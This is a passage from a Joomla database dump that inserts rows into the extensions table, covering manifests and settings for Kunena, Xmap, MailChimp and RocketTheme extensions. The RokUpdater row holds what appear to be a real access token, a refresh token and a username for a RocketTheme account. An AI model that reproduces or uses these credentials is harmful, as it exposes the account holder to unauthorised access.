lists.\",\"group\":\"\"}','{\"intro-text\":\"\",\"outro-text-1\":\"\",\"outro-text-2\":\"\",\"thankyou\":\"Thank you! Please check your email and confirm the newsletter subscription.\",\"updateMsg\":\"You were already subscribed to this list. Your settings have been updated. Thank you!\",\"listid\":\"\",\"fields\":\"\",\"interests\":\"\",\"dateFormat\":\"%Y-%m-%d\",\"phoneFormat\":\"inter\",\"address2\":\"0\"}','','',0,'0000-00-00 00:00:00',0,0),(10112,'MailChimp Stats','module','mod_mailchimpstats','',1,1,2,0,'{\"legacy\":true,\"name\":\"MailChimp Stats\",\"type\":\"module\",\"creationDate\":\"2011-04-22\",\"author\":\"freakedout\",\"copyright\":\"Copyright (C) 2011 freakedout - All rights reserved.\",\"authorEmail\":\"contact@feakedout.de\",\"authorUrl\":\"http:\\/\\/www.freakedout.de\",\"version\":\"1.1\",\"description\":\"This module shows a quick overview of your campaign statistics.\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10113,'joomlamailer','plugin','joomlamailer','community',0,1,1,0,'{\"legacy\":true,\"name\":\"joomlamailer\",\"type\":\"plugin\",\"creationDate\":\"2011-06-29\",\"author\":\"freakedout\",\"copyright\":\"Copyright (C) 2011 freakedout. All rights reserved.\",\"authorEmail\":\"contact@freakedout.de\",\"authorUrl\":\"www.freakedout.de\",\"version\":\"1.0\",\"description\":\"This plugin updates the email address in MailChimp lists when changed by the user.\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10117,'Kunena Media Files','file','kunena_media','',0,1,0,0,'{\"legacy\":false,\"name\":\"Kunena Media Files\",\"type\":\"file\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"(C) 2008 - 2013 Kunena Team. All rights reserved.\",\"authorEmail\":\"kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"Kunena media files.\",\"group\":\"\"}','','','',0,'0000-00-00 00:00:00',0,0),(10118,'Kunena Forum Package','package','pkg_kunena','',0,1,1,0,'{\"legacy\":false,\"name\":\"Kunena Forum Package\",\"type\":\"package\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"(C) 2008 - 2013 Kunena Team. All rights reserved.\",\"authorEmail\":\"kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"Kunena Forum Package.\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10121,'Button - RokBox','plugin','rokbox','editors-xtd',0,1,1,0,'{\"legacy\":false,\"name\":\"Button - RokBox\",\"type\":\"plugin\",\"creationDate\":\"March 4, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.0.7\",\"description\":\"This is an Editor Button to allow injection of RokBox snippets into your Content\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',1,0),(10148,'plg_content_kunenadiscuss','plugin','kunenadiscuss','content',0,1,1,0,'{\"legacy\":false,\"name\":\"plg_content_kunenadiscuss\",\"type\":\"plugin\",\"creationDate\":\"2013-06-29\",\"author\":\"Kunena Team\",\"copyright\":\"(C) 2008 - 2013 Kunena Team. All rights reserved.\",\"authorEmail\":\"admin@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.1\",\"description\":\"PLG_KUNENADISCUSS_DESCRIPTION\",\"group\":\"\"}','{\"limit\":\"25\",\"ordering\":\"1\",\"show_front_page\":\"2\",\"show_blog_page\":\"2\",\"show_other_pages\":\"2\",\"form\":\"1\",\"form_location\":\"0\",\"custom_topics\":\"1\",\"create\":\"0\",\"create_time\":\"1\",\"close_time\":\"0\",\"close_reason\":\"0\",\"bbcode\":\"default\",\"topic_owner\":\"\",\"category_mapping\":\"\",\"default_category\":\"\",\"allow_categories\":\"\",\"deny_categories\":\"\",\"show_debug\":\"0\",\"show_debug_userids\":\"\"}','','',0,'0000-00-00 00:00:00',0,0),(10149,'com_xmap','component','com_xmap','',1,1,0,0,'false','{}','','',0,'0000-00-00 00:00:00',0,0),(10150,'Xmap - Content Plugin','plugin','com_content','xmap',0,1,1,0,'{\"legacy\":false,\"name\":\"Xmap - Content Plugin\",\"type\":\"plugin\",\"creationDate\":\"01\\/26\\/2011\",\"author\":\"Guillermo Vargas\",\"copyright\":\"GNU GPL\",\"authorEmail\":\"guille@vargas.co.cr\",\"authorUrl\":\"joomla.vargas.co.cr\",\"version\":\"2.0.4\",\"description\":\"XMAP_CONTENT_PLUGIN_DESCRIPTION\",\"group\":\"\"}','{\"expand_categories\":\"1\",\"expand_featured\":\"1\",\"include_archived\":\"2\",\"show_unauth\":\"0\",\"add_pagebreaks\":\"1\",\"max_art\":\"0\",\"max_art_age\":\"0\",\"add_images\":\"1\",\"cat_priority\":\"-1\",\"cat_changefreq\":\"-1\",\"art_priority\":\"-1\",\"art_changefreq\":\"-1\",\"keywords\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(10151,'Xmap - Kunena Plugin','plugin','com_kunena','xmap',0,1,1,0,'{\"legacy\":false,\"name\":\"Xmap - Kunena Plugin\",\"type\":\"plugin\",\"creationDate\":\"September 2007\",\"author\":\"Guillermo Vargas\",\"copyright\":\"GNU GPL\",\"authorEmail\":\"guille@vargas.co.cr\",\"authorUrl\":\"joomla.vargas.co.cr\",\"version\":\"3.0.0\",\"description\":\"Xmap Plugin for Kunena component\",\"group\":\"\"}','{\"include_topics\":\"1\",\"max_topics\":\"\",\"max_age\":\"\",\"cat_priority\":\"-1\",\"cat_changefreq\":\"-1\",\"topic_priority\":\"-1\",\"topic_changefreq\":\"-1\"}','','',0,'0000-00-00 00:00:00',0,0),(10152,'Xmap - SobiPro Plugin','plugin','com_sobipro','xmap',0,1,1,0,'{\"legacy\":false,\"name\":\"Xmap - SobiPro Plugin\",\"type\":\"plugin\",\"creationDate\":\"07\\/15\\/2011\",\"author\":\"Guillermo Vargas\",\"copyright\":\"GNU GPL\",\"authorEmail\":\"guille@vargas.co.cr\",\"authorUrl\":\"joomla.vargas.co.cr\",\"version\":\"2.0.2\",\"description\":\"Xmap Plugin for SobiPro component\",\"group\":\"\"}','{\"include_entries\":\"1\",\"max_entries\":\"\",\"max_age\":\"\",\"entries_order\":\"a.ordering\",\"entries_orderdir\":\"DESC\",\"cat_priority\":\"-1\",\"cat_changefreq\":\"weekly\",\"entry_priority\":\"-1\",\"entry_changefreq\":\"weekly\"}','','',0,'0000-00-00 00:00:00',0,0),(10153,'Xmap - Mosets Tree Plugin','plugin','com_mtree','xmap',0,1,1,0,'{\"legacy\":false,\"name\":\"Xmap - Mosets Tree Plugin\",\"type\":\"plugin\",\"creationDate\":\"07\\/20\\/2011\",\"author\":\"Guillermo Vargas\",\"copyright\":\"GNU GPL\",\"authorEmail\":\"guille@vargas.co.cr\",\"authorUrl\":\"joomla.vargas.co.cr\",\"version\":\"2.0.2\",\"description\":\"XMAP_MTREE_PLUGIN_DESCRIPTION\",\"group\":\"\"}','{\"cats_order\":\"cat_name\",\"cats_orderdir\":\"ASC\",\"include_links\":\"1\",\"links_order\":\"ordering\",\"entries_orderdir\":\"ASC\",\"max_links\":\"\",\"max_age\":\"\",\"cat_priority\":\"0.5\",\"cat_changefreq\":\"weekly\",\"link_priority\":\"0.5\",\"link_changefreq\":\"weekly\"}','','',0,'0000-00-00 00:00:00',0,0),(10154,'Xmap - Virtuemart Plugin','plugin','com_virtuemart','xmap',0,1,1,0,'{\"legacy\":false,\"name\":\"Xmap - Virtuemart Plugin\",\"type\":\"plugin\",\"creationDate\":\"January 2012\",\"author\":\"Guillermo Vargas\",\"copyright\":\"GNU GPL\",\"authorEmail\":\"guille@vargas.co.cr\",\"authorUrl\":\"joomla.vargas.co.cr\",\"version\":\"2.0.3\",\"description\":\"XMAP_VM_PLUGIN_DESCRIPTION\",\"group\":\"\"}','{\"include_products\":\"1\",\"cat_priority\":\"-1\",\"cat_changefreq\":\"-1\",\"prod_priority\":\"-1\",\"prod_changefreq\":\"-1\"}','','',0,'0000-00-00 00:00:00',0,0),(10155,'Xmap - WebLinks Plugin','plugin','com_weblinks','xmap',0,1,1,0,'{\"legacy\":false,\"name\":\"Xmap - WebLinks Plugin\",\"type\":\"plugin\",\"creationDate\":\"Apr 2004\",\"author\":\"Guillermo Vargas\",\"copyright\":\"GNU GPL\",\"authorEmail\":\"guille@vargas.co.cr\",\"authorUrl\":\"joomla.vargas.co.cr\",\"version\":\"2.0.1\",\"description\":\"XMAP_WL_PLUGIN_DESCRIPTION\",\"group\":\"\"}','{\"include_links\":\"1\",\"max_links\":\"\",\"cat_priority\":\"-1\",\"cat_changefreq\":\"-1\",\"link_priority\":\"-1\",\"link_changefreq\":\"-1\"}','','',0,'0000-00-00 00:00:00',0,0),(10156,'XMAP_PLUGIN_K2','plugin','com_k2','xmap',0,1,1,0,'{\"legacy\":false,\"name\":\"XMAP_PLUGIN_K2\",\"type\":\"plugin\",\"creationDate\":\"November 2011\",\"author\":\"Mohammad Hasani Eghtedar\",\"copyright\":\"GNU GPL\",\"authorEmail\":\"m.h.eghtedar@gmail.com\",\"authorUrl\":\"https:\\/\\/github.com\\/mhehm\\/Xmap\",\"version\":\"1.3\",\"description\":\"XMAP_PLUGIN_K2_DESC\",\"group\":\"\"}','{\"subcategories\":\"no\",\"showk2items\":\"always\",\"suppressdups\":\"no\",\"priority\":\"0.5\",\"changefreq\":\"weekly\"}','','',0,'0000-00-00 00:00:00',0,0),(10157,'Xmap Package','package','pkg_xmap','',0,1,1,0,'{\"legacy\":false,\"name\":\"Xmap Package\",\"type\":\"package\",\"creationDate\":\"Unknown\",\"author\":\"Unknown\",\"copyright\":\"\",\"authorEmail\":\"\",\"authorUrl\":\"\",\"version\":\"2.3.3\",\"description\":\"The Site Map generator for Joomla!\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10169,'Gantry','library','lib_gantry','',0,1,1,0,'{\"legacy\":false,\"name\":\"Gantry\",\"type\":\"library\",\"creationDate\":\"April 12, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"4.1.24\",\"description\":\"Gantry Starting Template for Joomla! v4.1.24\",\"group\":\"\"}','{}','{\"last_update\":1397501886}','',0,'0000-00-00 00:00:00',0,0),(10177,'CEGCore','library','cegcore','',0,1,1,0,'{\"legacy\":false,\"name\":\"CEGCore\",\"type\":\"library\",\"creationDate\":\"01.2014\",\"author\":\"ChronoEngine.com\",\"copyright\":\"Copyright (C) 2013\",\"authorEmail\":\"webmaster@chronoengine.com\",\"authorUrl\":\"www.chronoengine.com\",\"version\":\"1.0\",\"description\":\"The GCore framework classes!\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10181,'Kunena Framework','library','kunena','',0,1,1,0,'{\"legacy\":false,\"name\":\"Kunena Framework\",\"type\":\"library\",\"creationDate\":\"2014-03-09\",\"author\":\"Kunena Team\",\"copyright\":\"(C) 2008 - 2013 Kunena Team. All rights reserved.\",\"authorEmail\":\"kunena@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.5\",\"description\":\"Kunena Framework.\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10182,'plg_search_kunena','plugin','kunena','search',0,0,1,0,'{\"legacy\":false,\"name\":\"plg_search_kunena\",\"type\":\"plugin\",\"creationDate\":\"2013-06-29\",\"author\":\"Kunena Team\",\"copyright\":\"(C) 2008 - 2013 Kunena Team. All rights reserved.\",\"authorEmail\":\"admin@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.1\",\"description\":\"PLG_SEARCH_KUNENA_DESCRIPTION\",\"group\":\"\"}','{\"search_limit\":\"50\",\"content_limit\":\"40\",\"show_bbcode\":\"1\",\"open_new_page\":\"1\"}','','',0,'0000-00-00 00:00:00',0,0),(10183,'mod_kunenastats','module','mod_kunenastats','',0,1,0,0,'{\"legacy\":false,\"name\":\"mod_kunenastats\",\"type\":\"module\",\"creationDate\":\"2013-06-29\",\"author\":\"Kunena Team\",\"copyright\":\"(C) 2008 - 2013 Kunena Team. All rights reserved.\",\"authorEmail\":\"admin@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.1\",\"description\":\"MOD_KUNENASTATS_DESCRIPTION\",\"group\":\"\"}','{\"type\":\"general\",\"items\":\"5\",\"titlelength\":\"50\",\"sh_statslink\":\"0\",\"owncache\":\"1\",\"cache_time\":\"180\"}','','',0,'0000-00-00 00:00:00',0,0),(10184,'mod_kunenalatest','module','mod_kunenalatest','',0,1,0,0,'{\"legacy\":false,\"name\":\"mod_kunenalatest\",\"type\":\"module\",\"creationDate\":\"2013-06-29\",\"author\":\"Kunena Team\",\"copyright\":\"(C) 2008 - 2013 Kunena Team. All rights reserved.\",\"authorEmail\":\"admin@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.1\",\"description\":\"MOD_KUNENALATEST_DESCRIPTION\",\"group\":\"\"}','{\"category_id\":\"0\",\"sh_category_id_in\":\"1\",\"choosemodel\":\"latest\",\"show_list_time\":\"168\",\"nbpost\":\"5\",\"titlelength\":\"50\",\"messagelength\":\"150\",\"lengthcontentcharacters\":\"0\",\"unreadindicator\":\"!\",\"sh_topiciconoravatar\":\"0\",\"avatarwidth\":\"36px\",\"avatarheight\":\"36px\",\"sh_category\":\"1\",\"sh_author\":\"1\",\"sh_time\":\"1\",\"sh_firstcontentcharacter\":\"0\",\"sh_favorite\":\"0\",\"sh_locked\":\"0\",\"sh_sticky\":\"0\",\"sh_postcount\":\"0\",\"kunena_load_css\":\"1\",\"sh_morelink\":\"0\",\"subjecttitle\":\"none\",\"owncache\":\"1\",\"cache_time\":\"180\"}','','',0,'0000-00-00 00:00:00',0,0),(10185,'mod_kunenasearch','module','mod_kunenasearch','',0,1,0,0,'{\"legacy\":false,\"name\":\"mod_kunenasearch\",\"type\":\"module\",\"creationDate\":\"2013-06-29\",\"author\":\"Kunena Team\",\"copyright\":\"(C) 2008 - 2013 Kunena Team. All rights reserved.\",\"authorEmail\":\"admin@kunena.org\",\"authorUrl\":\"http:\\/\\/www.kunena.org\",\"version\":\"3.0.1\",\"description\":\"MOD_KUNENASEARCH_DESCRIPTION\",\"group\":\"\"}','{\"ksearch_width\":\"20\",\"ksearch_txt\":\"\",\"ksearch_button\":\"\",\"ksearch_button_pos\":\"right\",\"ksearch_button_txt\":\"Search\",\"owncache\":\"1\",\"cache_time\":\"180\"}','','',0,'0000-00-00 00:00:00',0,0),(10189,'RokCommon','library','lib_rokcommon','',0,1,1,0,'{\"legacy\":false,\"name\":\"RokCommon\",\"type\":\"library\",\"creationDate\":\"March 11, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"3.1.11\",\"description\":\"RokCommon Shared Library\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10190,'RokGallery','component','com_rokgallery','',1,1,0,0,'{\"legacy\":false,\"name\":\"RokGallery\",\"type\":\"component\",\"creationDate\":\"March 15, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.29\",\"description\":\"Parent for all PHP based projects\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10191,'RokGallery Module','module','mod_rokgallery','',0,1,1,0,'{\"legacy\":false,\"name\":\"RokGallery Module\",\"type\":\"module\",\"creationDate\":\"March 15, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.29\",\"description\":\"Module for displaying RokGallery\",\"group\":\"\"}','{\"link\":\"0\",\"default_menuitem\":\"0\",\"title\":\"false\",\"caption\":\"false\",\"sort_by\":\"gallery_ordering\",\"sort_direction\":\"ASC\",\"limit_count\":\"10\",\"css_style\":\"light\",\"layout\":\"grid\",\"columns\":\"1\",\"arrows\":\"onhover\",\"navigation\":\"thumbnails\",\"animation_type\":\"random\",\"animation_duration\":\"500\",\"autoplay_enabled\":\"0\",\"autoplay_delay\":\"7\",\"showcase_arrows\":\"onhover\",\"showcase_image_position\":\"left\",\"showcase_imgpadding\":\"0\",\"showcase_animation_type\":\"random\",\"showcase_captionsanimation\":\"crossfade\",\"showcase_animation_duration\":\"500\",\"showcase_autoplay_enabled\":\"0\",\"showcase_autoplay_delay\":\"7\",\"showcase_responsive_arrows\":\"onhover\",\"showcase_responsive_image_position\":\"left\",\"showcase_responsive_imgpadding\":\"0\",\"showcase_responsive_animation_type\":\"random\",\"showcase_responsive_captionsanimation\":\"crossfade\",\"showcase_responsive_animation_duration\":\"500\",\"showcase_responsive_autoplay_enabled\":\"0\",\"showcase_responsive_autoplay_delay\":\"7\",\"cache\":\"0\",\"module_cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}','','',0,'0000-00-00 00:00:00',0,0),(10192,'Button - RokGallery','plugin','rokgallery','editors-xtd',0,1,1,0,'{\"legacy\":false,\"name\":\"Button - RokGallery\",\"type\":\"plugin\",\"creationDate\":\"March 15, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.29\",\"description\":\"This is an Editor Button to allow selection of RokGallery Slices\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',50,0),(10193,'System - RokGallery','plugin','rokgallery','system',0,1,1,0,'{\"legacy\":false,\"name\":\"System - RokGallery\",\"type\":\"plugin\",\"creationDate\":\"March 15, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.29\",\"description\":\"A system level support plugin for RokGallery.\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',50,0),(10199,'RokFeatureTable','module','mod_rokfeaturetable','',0,1,1,0,'{\"legacy\":false,\"name\":\"RokFeatureTable\",\"type\":\"module\",\"creationDate\":\"November 5, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"1.5\",\"description\":\"\\n\\tRokFeatureTable is a very simple yet powerful module for providing tabular data. It comes with pre-populated templates and allows to create your own directly from your own template.\\n\\tRokFeatureTable reads custom templates that are found under \\\"templates\\/your_active_template\\/admin\\/rft-templates\\/\\\". They must be .txt files. You can see a couple of examples from \\\"modules\\/mod_rokfeaturetable\\/templates\\/\\\".\\n\\t\",\"group\":\"\"}','{\"builtin_css\":\"1\",\"highlight-col\":\"1\",\"cache\":\"0\",\"module_cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}','','',0,'0000-00-00 00:00:00',0,0),(10201,'RokMiniEvents3','module','mod_rokminievents3','',0,1,1,0,'{\"legacy\":false,\"name\":\"RokMiniEvents3\",\"type\":\"module\",\"creationDate\":\"April 9, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"3.0.0\",\"description\":\"RokMiniEvents3 allows to share your Joomla! website Calendar Events from Google, EventList, JEvents, JomSocial, RedEvent and RSEvents\",\"group\":\"\"}','{\"builtin_css\":\"1\",\"sortorder\":\"ascending\",\"time_range\":\"predefined_ranges\",\"startmin\":\"\",\"startmax\":\"\",\"rangespan\":\"current_month\",\"show_description\":\"1\",\"strip_tags\":\"a,i,br\",\"trim_description\":\"1\",\"trim_count\":\"200\",\"localtime\":\"local\",\"timezone\":\"0\",\"dayformat\":\"%d\",\"monthformat\":\"%b\",\"yearformat\":\"%Y\",\"timeformat\":\"%I:%M %p\",\"datedisplay\":\"badge\",\"showyear\":\"0\",\"limit_count\":\"0\",\"events_pane\":\"3\",\"timeline\":\"both\",\"cache\":\"0\",\"module_cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}','','',0,'0000-00-00 00:00:00',0,0),(10205,'System - RokUpdater','plugin','rokupdater','system',0,1,1,0,'{\"legacy\":false,\"name\":\"System - RokUpdater\",\"type\":\"plugin\",\"creationDate\":\"November 5, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"1.0.8\",\"description\":\"\\n        \\n        <div class=\\\"updater-description\\\">\\n        <img src=\\\"..\\/plugins\\/system\\/rokupdater\\/assets\\/images\\/RokUpdater_154.png\\\" class=\\\"img-padding\\\" \\/><h1>RokUpdater<\\/h1>\\n        <p>RokUpdater allows you to update RocketTheme extensions you have access to with your RocketTheme subscription.<\\/p>\\n        <\\/div>\\n        \\n    \",\"group\":\"\"}','{\"show_auth_on_updates\":\"1\",\"hide_unavailable\":\"0\",\"fallback_to_http_for_auth\":\"0\",\"debugloglevel\":\"63\"}','{\"access_token\":\"583a39c62c391c33bb9dfc8532c377586ef0a0e8\",\"expires\":1397767449,\"scope\":\"updates\",\"refresh_token\":\"9d056cf77183f62f1bf4900c6cd3b7fd49069e6d\",\"token_type\":\"bearer\",\"notice\":null,\"username\":\"kstorm\",\"subscriptions\":[{\"club\":\"RocketTheme Member\",\"active\":1}]}','',0,'0000-00-00 00:00:00',10,0),(10209,'Content - RokSocialButtons','plugin','roksocialbuttons','content',0,1,1,0,'{\"legacy\":false,\"name\":\"Content - RokSocialButtons\",\"type\":\"plugin\",\"creationDate\":\"November 5, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"1.5.2\",\"description\":\"RokSocialButtons Content Plugin.  Use format {socialbuttons} in your article to display the social buttons in your article\",\"group\":\"\"}','{\"addthis_id\":\"\",\"enable_twitter\":\"1\",\"enable_facebook\":\"1\",\"enable_google\":\"1\",\"prepend_text\":\"\",\"extra_class\":\"\",\"display_position\":\"0\",\"add_method\":\"2\",\"catid\":\"\"}','','',0,'0000-00-00 00:00:00',5,0),(10211,'RokBridge','component','com_rokbridge','',1,1,0,0,'{\"legacy\":false,\"name\":\"RokBridge\",\"type\":\"component\",\"creationDate\":\"June 14, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"3.2\",\"description\":\"RokBridge is a non-invasive, bi-directional bridge for Joomla and the forum platform phpBB3\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',0,0),(10212,'RokBridge User Synchronisation Plugin','plugin','phpbb3_user','user',0,1,1,0,'{\"legacy\":false,\"name\":\"RokBridge User Synchronisation Plugin\",\"type\":\"plugin\",\"creationDate\":\"June 14, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"3.2\",\"description\":\"Handles phpBB3 user synchronisation\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',2,0),(10213,'RokBridge User Authentication Plugin','plugin','phpbb3_auth','authentication',0,1,1,0,'{\"legacy\":false,\"name\":\"RokBridge User Authentication Plugin\",\"type\":\"plugin\",\"creationDate\":\"June 14, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"3.2\",\"description\":\"A phpBB3 authentication plugin\",\"group\":\"\"}','{}','','',0,'0000-00-00 00:00:00',3,0),(10214,'RokBridge Members','module','mod_rokbridge_members','',0,1,1,0,'{\"legacy\":false,\"name\":\"RokBridge Members\",\"type\":\"module\",\"creationDate\":\"June 14, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"3.2\",\"description\":\"MOD_ROKBRIDGE_MEMBERS_XML_DESCRIPTION\",\"group\":\"\"}','{\"modulemode\":\"1\",\"limit\":\"20\",\"formatdate\":\"d\\/m\\/Y G:i\",\"showextra\":\"0\",\"showavatar\":\"1\",\"avatar_size\":\"32\",\"default_avatar\":\"modules\\/mod_rokbridge_members\\/assets\\/default-avatar.png\",\"showprofilelink\":\"1\",\"profiletargetwin\":\"_top\",\"onlinetime\":\"5\",\"showonlinecount\":\"1\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}','','',0,'0000-00-00 00:00:00',0,0),(10215,'RokBridge Login','module','mod_rokbridge_login','',0,1,1,0,'{\"legacy\":false,\"name\":\"RokBridge Login\",\"type\":\"module\",\"creationDate\":\"June 14, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"3.2\",\"description\":\"MOD_ROKBRIDGE_LOGIN_XML_DESCRIPTION\",\"group\":\"\"}','{\"greeting\":\"1\",\"autoremember\":\"0\",\"name\":\"0\",\"usesecure\":\"0\",\"avatar\":\"1\",\"avatar_size\":\"55\",\"show_default_avatar\":\"1\",\"default_avatar\":\"modules\\/mod_rokbridge_login\\/assets\\/default-avatar.png\",\"messages\":\"1\",\"lastvisit\":\"1\",\"unanswered\":\"1\",\"new\":\"1\",\"active\":\"1\",\"yours\":\"1\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}','','',0,'0000-00-00 00:00:00',0,0),(10216,'RokBridge Latest Posts','module','mod_rokbridge_latest_posts','',0,1,1,0,'{\"legacy\":false,\"name\":\"RokBridge Latest Posts\",\"type\":\"module\",\"creationDate\":\"June 14, 2013\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2013 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"3.2\",\"description\":\"MOD_ROKBRIDGE_LATEST_POSTS_XML_DESCRIPTION\",\"group\":\"\"}','{\"forumincl\":\"\",\"forumexcl\":\"\",\"limit\":\"5\",\"formatdate\":\"d\\/m\\/Y G:i\",\"showcreated\":\"0\",\"directpost\":\"0\",\"showre\":\"1\",\"posttargetwin\":\"_top\",\"showprofilelink\":\"0\",\"profiletargetwin\":\"_top\",\"cache\":\"1\",\"cache_time\":\"900\",\"cachemode\":\"static\"}','','',0,'0000-00-00 00:00:00',0,0),(10218,'Content - RokComments','plugin','rokcomments','content',0,1,1,0,'{\"legacy\":false,\"name\":\"Content - RokComments\",\"type\":\"plugin\",\"creationDate\":\"March 4, 2014\",\"author\":\"RocketTheme, LLC\",\"copyright\":\"(C) 2005 - 2014 RocketTheme, LLC. All rights reserved.\",\"authorEmail\":\"support@rockettheme.com\",\"authorUrl\":\"http:\\/\\/www.rockettheme.com\",\"version\":\"2.0.2\",\"description\":\"\\n      \\n      <div class=\\\"rc-wrapper\\\">\\n\\n      <h1>RokComments<\\/h1>\\n      <p> RokComments is a powerful content plugin that allows for easy integration of third-party JavaScript-based comment systems such as <b><a href=\\\"#intnse\\\">IntenseDebate<\\/a><\\/b>, <b><a href=\\\"#facebook\\\">Facebook<\\/a><\\/b>, <b><a href=\\\"disqus\\\">Disqus<\\/a><\\/b>, <b><a href=\\\"#livefyre\\\">Livefyre<\\/a><\\/b>, and <b>JS-Kit<\\/b> <em>(Deprecated)<\\/em><\\/p>\\n\\n      <a name=\\\"intense\\\"><\\/a>\\n      <h2>IntenseDebate<\\/h2>\\n      <p><img src=\\\"..\\/plugins\\/content\\/rokcomments\\/images\\/id-comments-acct.jpg\\\" \\\"\\/>To setup RokComments to use IntenseDebate, you first have to sign up at <a href=\\\"http:\\/\\/intensedebate.com\\\" target=\\\"_new\\\">http:\\/\\/intensedebate.com<\\/a>. Once you have created an account, you need to select <strong>\\\"Sites\\\"<\\/strong> from the top menu, then click <strong>\\\"+ Add 